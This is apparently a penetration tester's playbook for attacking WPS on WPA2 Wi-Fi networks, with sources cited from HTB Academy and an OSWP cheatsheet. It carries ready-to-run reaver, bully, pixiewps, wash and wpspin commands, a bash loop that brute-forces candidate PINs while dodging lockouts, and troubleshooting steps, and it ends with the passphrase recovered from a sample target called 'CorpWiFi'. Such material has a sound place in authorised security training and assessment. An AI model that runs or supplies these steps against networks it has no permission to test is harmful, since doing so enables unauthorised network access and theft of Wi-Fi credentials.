# Wireless - WPS attacks

## Read the WPS state before anything else on a WPA2 network

**Trigger:** Any WPA2/WPA3-PSK target, before committing to a passphrase attack.

WPS is a shortcut past the passphrase entirely, so it is always the first thing to check and it invalidates the usual reasoning about passphrase strength — a 40-character random PSK is irrelevant if the PIN that hands it over is recoverable in seconds. The protocol validates an eight-digit PIN in two independent halves with the last digit a checksum, which collapses the search space from 10^8 to roughly 11,000 attempts, and a recovered PIN returns the plaintext PSK. Read three things from the survey. The **version**: `0.0` means WPS is absent, `1.0` and `2.0` mean present, and 1.0 is generally softer. The **lock state**: a locked AP rejects every online attempt and the brute-force path is dead until it clears, though pixie-dust may still work because it needs only one exchange. And the **configuration methods**, which tell you how the AP expects to be paired — `LAB` (label), `DISP` (display), `KPAD` (keypad) are PIN methods and are attackable, while `PBC` (push button) means someone physically pressed the button and the AP is currently handing out the PSK to anyone who asks. Seeing PBC advertised during a survey is an immediate free win — connect and read the PSK straight out of the exchange; it normally only appears while someone is physically pressing the button.

```bash
sudo airodump-ng wlan0mon --essid "CorpWiFi" --wps
sudo airodump-ng wlan0mon --essid "CorpWiFi" --wps -c 1 --bssid 10:7B:EF:08:A3:B4
sudo wash -i wlan0mon                      # dedicated WPS scanner
sudo wash -i wlan0mon -s                   # include the lock state column

# Reading the columns:
#   WPS 0.0                -> not enabled; go back to wpa2-psk-handshake-and-pmkid.md
#   WPS 1.0 / 2.0          -> attackable
#   Lck = Yes              -> online brute dead for now; pixie-dust may still work
#   LAB / DISP / KPAD      -> PIN methods, attackable
#   PBC                    -> push-button active right now; connect and read the PSK
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Initial Reconnaissance, Compromising WPA2 Wi-Fi Network; offsecexams.com OSWP cheatsheet

## Pixie-dust first, because it is offline

**Trigger:** WPS is advertised, and you want the cheapest attempt before anything that touches the AP repeatedly.

Pixie-dust exploits weak nonce generation in the AP's WPS implementation: many chipsets derive the E-S1 and E-S2 secrets from a poor entropy source or leave them as zeros, which means a single captured exchange contains enough material to solve for the PIN offline in seconds. That makes it strictly better than the online brute force where it works — one exchange, no lockout risk, no sustained load on a production AP — so it is always the first attempt. It is chipset-dependent, so failure tells you the AP's implementation is sound rather than that WPS is safe, and you fall through to the online path. Run it against a monitor interface created with `iw` rather than `airmon-ng`, because a long-standing interaction between airmon-ng's interface renaming and reaver's handling causes reaver to associate successfully and then fail without a useful error, which is one of the most time-wasting failure modes in the whole toolkit. If reaver's pixie-dust support gives you trouble, `bully` implements the same attack with a different code path and is worth a second attempt before concluding the AP is not vulnerable.

```bash
sudo iw dev wlan0 interface add mon0 type monitor      # NOT airmon-ng, for reaver
sudo ifconfig mon0 up

sudo reaver -i mon0 -b 10:7B:EF:08:A3:B4 -c 1 -K -SNLAvv
#   -K   pixie-dust (offline)
#   -S   small DH keys, faster
#   -N   do not send NACKs
#   -L   ignore locked state
#   -A   do not associate automatically
#   -vv  verbose

# Second implementation, worth trying if reaver's fails
sudo bully mon0 -b 10:7B:EF:08:A3:B4 -c 1 -d -v 3

# Manual: capture the exchange, solve separately
sudo pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <E-Nonce>
```

Source: offsecexams.com OSWP cheatsheet

## Vendor PIN generation — the corporate shortcut

**Trigger:** Pixie-dust failed, and the AP's OUI identifies a known manufacturer.

Many vendors derive the default WPS PIN algorithmically from the device's MAC address, which means that for a large fraction of consumer and small-business hardware the correct PIN is computable rather than searchable. This is the highest-value WPS path in a corporate engagement because it turns an 11,000-attempt online brute force — which would take hours and trip lockouts on a production AP — into a handful of candidates. Identify the vendor from the BSSID prefix first, then generate candidates for that specific MAC. A single "24-bit PIN" candidate is the algorithmic guess for that vendor family; if it fails, generate the full candidate set, which covers every known derivation algorithm plus the common static defaults. Published static default-PIN lists are worth a glance too, but generation is better because it accounts for the MAC. The important discipline here is throttling: you now have forty-odd candidates rather than eleven thousand, but the AP still locks after a few failures, so pace the attempts rather than firing them in a loop.

```bash
grep -i "107BEF" /var/lib/ieee-data/oui.txt         # identify the vendor first

wpspin 10:7B:EF:08:A3:B4                            # algorithmic candidate(s)
wpspin -A 10:7B:EF:08:A3:B4                         # all known algorithms + defaults

# Extract just the PINs for scripting
wpspin -A 10:7B:EF:08:A3:B4 | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '

# Common static defaults worth trying regardless
#   12345670  00000000  01234567
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Compromising WPA2 Wi-Fi Network

## Throttled PIN testing that survives lockout

**Trigger:** You have a candidate PIN list and need to test it against a production AP without knocking it over.

Hammering WPS is the fastest way to turn a recoverable finding into an outage: APs lock after a handful of failures, some stay locked for hours, and a few older ones crash outright. The correct shape is one attempt per PIN, a pause after a lockout, and a longer pause every few attempts, which trades wall-clock time for the ability to keep going — and on a candidate list of forty rather than eleven thousand, the time cost is trivial. Drive it from a loop so each PIN gets exactly one attempt and the process moves on rather than retrying, and watch for the AP's lock state rather than assuming. Reaver reports success as both the PIN and the recovered PSK, which is the moment the attack ends; note that reaver writes progress to a session file, so an interrupted run resumes rather than starting over. If the whole candidate list fails and the AP is not locked, the online half-by-half brute force remains available: it is the full ~11,000-attempt search, takes hours at a safe attempt rate, and puts sustained load on the AP, so it is the last thing to try rather than the first.

```bash
#!/bin/bash
# One attempt per candidate PIN, paced to survive lockout.
BSSID=10:7B:EF:08:A3:B4
CH=1
IFACE=mon0
PINS="05661961 22244369 03208205 49610765 12982288 73426448 18382167 05835355"

for PIN in $PINS; do
    echo "[*] Attempting PIN: $PIN"
    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i "$IFACE" -b "$BSSID" -c "$CH" -p "$PIN"
done
echo "[*] PIN guesses complete"
#   --max-attempts=1  one try per PIN, then move on
#   -l 100            wait 100s if the AP locks
#   -r 3:45           sleep 45s after every 3 attempts

# Full online brute force — last resort, raise with the client first
sudo reaver -i mon0 -b 10:7B:EF:08:A3:B4 -c 1 -SNLAsvv -d 1 -r 5:3

# Success looks like:
#   [+] WPS PIN: '05661961'
#   [+] WPA PSK: 'TheActualPassphrase'
#   [+] AP SSID: 'CorpWiFi'
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Compromising WPA2 Wi-Fi Network; offsecexams.com OSWP cheatsheet

## Diagnosing a WPS attack that associates but never progresses

**Trigger:** Reaver reports repeated `Associated with <BSSID>` lines and nothing else, or `WPS transaction failed`, or `Failed to recover WPA key` on every PIN.

Four distinct causes produce nearly identical output and they need different responses. The first and most common is the monitor-interface problem: an interface created by `airmon-ng` rather than by `iw` makes reaver associate and then stall silently, so recreate the interface with `iw dev ... interface add` before believing anything else the tool tells you. The second is rate limiting — the AP has locked and is refusing every attempt regardless of correctness, visible as `Lck: Yes` in `wash -s`; the response is to back off, not to increase the attempt rate. The third is signal quality: WPS is chatty and needs a stable link, so a marginal signal produces `bad FCS` messages and timeouts that look like failures, and moving closer or changing antennas fixes it. The fourth is that the AP advertises WPS but has it functionally disabled in the firmware, which some vendors ship as a default; the tell is that association always succeeds and the M1 message never arrives. Distinguish them before changing tactics, because increasing the attempt rate — the instinctive response — makes three of the four worse.

```bash
sudo wash -i mon0 -s -c 1                    # is Lck now Yes?
sudo aireplay-ng -9 -a 10:7B:EF:08:A3:B4 mon0   # link quality to this AP

sudo reaver -i mon0 -b 10:7B:EF:08:A3:B4 -c 1 -vvv   # full protocol trace
#   no M1 after association  -> WPS advertised but disabled in firmware
#   repeated "bad FCS"       -> signal quality; move closer
#   0x03 / NACK on every PIN -> locked; back off
#   silent stall             -> recreate the interface with iw, not airmon-ng

# Reaver keeps a resumable session
ls /etc/reaver/ /var/lib/reaver/
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Compromising WPA2 Wi-Fi Network; operator practice
